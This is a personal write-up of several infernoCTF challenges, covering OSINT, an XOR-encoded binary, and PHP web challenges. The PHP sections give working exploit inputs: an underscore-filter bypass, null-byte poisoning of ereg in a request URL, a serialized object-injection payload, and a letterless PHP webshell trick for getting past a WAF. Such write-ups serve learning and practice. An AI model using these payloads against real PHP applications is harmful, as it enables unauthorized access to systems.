Hi fellas, imma back again but this time i participated an online CTF which was a dream for me ;)

It was a lil frustrating because due to inexperince i wasn't able to solve 3 challenges which was really sneaky and i love them. Here i'll discuss how i approached them.

#### Discord
For this challenge the flag was available at discord server in channel `#announcement`.

```text
Flag: infernoCTF{Y0u_sh4ll_R0t_1n_h3ll_n0w}
```

#### New Developer
This was also very easy OSINT challenge.

I checked iamthedeveloper123's repositories list, latest commit by this time was in `bash2018` repo.

So i checked latest commit for which it was 1 commit ahead of parent [f6008f3d67829ad0ab19d029eec6833a196db8d8](https://github.com/iamthedeveloper123/bash2048/commit/f6008f3d67829ad0ab19d029eec6833a196db8d8).

```bash
  printf "\nYou have lost, better luck next time.\033[0m\n"
  source ../dotfiles/.bashrc2
  printf "\nYou have lost, try going to https://pastebin.com/$CODE for help!.  (And also for some secrets...) \033[0m\n"
```
Here it was confirmed that the `.bashrc2` file in other repo sets a variable `CODE`. By checking that file [here](https://github.com/iamthedeveloper123/dotfiles/blob/5365d3e99331d2b301dc7a0572afdd78b4c6e2db/.bashrc2#L83), i got value of CODE (`trpNwEPT`) which is the pastebin shorten code. And opeing [https://pastebin.com/trpNwEPT](https://pastebin.com/trpNwEPT) gives us the flag.

```

Btw i was unable to solve the other challenge `Whistle Blower` which was related to this. I got a hint i guess for `InfoSec` twitter.

#### Where did he GO?
This was pretty straight forward.

The string flag was stored in bytes. so i added a print statement to see it and run without entering any password.

```bash
$ ./test 
Enter Password: 

# encrypted code
!!tA3rG_s1_gn1MMaRg0rP_0g

# mandir_wahi_banega

# jai_ram_ji_ki

# mandir_wahi_banega

# jai_ram_ji_ki

Don't Worry, Relax, Chill and Try harder
```

Becuse it was using `^` for encryption, i enterned flag as password to get the decrypted string:

```bash
$ ./test
Enter Password: !!tA3rG_s1_gn1MMaRg0rP_0g

# encrypted code
!!tA3rG_s1_gn1MMaRg0rP_0g

# mandir_wahi_banega
!!tA3rG_s1_gn1MMaRg0rP_0g

# jai_ram_ji_ki
g0_Pr0gRaMM1ng_1s_Gr3At!!
g0_Pr0gRaMM1ng_1s_Gr3At!!

# mandir_wahi_banega
!!tA3rG_s1_gn1MMaRg0rP_0g

# jai_ram_ji_ki
g0_Pr0gRaMM1ng_1s_Gr3At!!

Don't Worry, Relax, Chill and Try harder
```

Now print statements are removed and re compiled & run again:

```bash
$ ./test
Enter Password: g0_Pr0gRaMM1ng_1s_Gr3At!!
You Cracked it, A Hero is born
```

```text
Flag: infernoCTF{g0_Pr0gRaMM1ng_1s_Gr3At!!}
```

#### Check Again
This pissed off a lot !

The hint `[D]ante [N]ero [S]parda a[re] the true de[mon]s.` was awesome ! Here i get `DNSremon` which is close enough to `dnsrecon`.

```bash
$ dnsrecon -d infernoctf.live

#### Dante's Personal Home Page
`preg_match("/_| /i", $check)` can be passed using `.` which transforms to `_` in php external variables. Thanks to @13k53c for pointing to the external variable docs.

It was exploiting null byte poisoning to bypass egrep which was the second check (`ereg ("^[a-zA-Z0-9]+$", $magic)`) using any alpha numeric and `%00`. For example: `abc123%00`

The request URL can be:`http://104.197.168.32:17011/?..magic..=ABC%00$dark$`

```text

```

**UPDATE**

#### Dank PHP
First i created a `test.php` file to generate searilized data for the `id`. Which looks like below snippet:

```php
<?php

class user {
  var $name;
  var $pass;
  var $secret;
}

$new_user = new user();

$new_user->name = "admin";
$new_user->pass = &$new_user->secret;

echo (serialize($new_user));

?>
```

This generates the serialized data `O:4:"user":3:{s:4:"name";s:5:"admin";s:4:"pass";N;s:6:"secret";R:3;}` for `id` param. Then i used python `urllib` to encode it properly:

```python
>>> import urllib
>>> urllib.quote('O:4:"user":3:{s:4:"name";s:5:"admin";s:4:"pass";N;s:6:"secret";R:3;}')
'O%3A4%3A%22user%22%3A3%3A%7Bs%3A4%3A%22name%22%3Bs%3A5%3A%22admin%22%3Bs%3A4%3A%22pass%22%3BN%3Bs%3A6%3A%22secret%22%3BR%3A3%3B%7D'
```

Now the second part was to bypass WAF and run `echoFlag()`. Which can be done with Php webshell without numbers and letters. And there was also a length limitation of 45 digits. So we required string length 45. Thanks to @13k53c again, he was able to discover [40 digits webshell](https://gist.github.com/mvisat/03592a5ab0743cd43c2aa65bf45fef21).

Now the `caption` param becomes `caption = "$_=" + make_letters("echoFlag") + ";$_();"`.

I was about to write my curl style here but @13k53c shared his awesome python script to do whole process and print the flag in one script. The script is [here](https://ideone.com/xxJmE0).

Yeh definitely, it was a headache ;(

Thanks for reading ;) Will update it later when ingoing challenges are solved. Btw imma doing another CTF so, this is it !
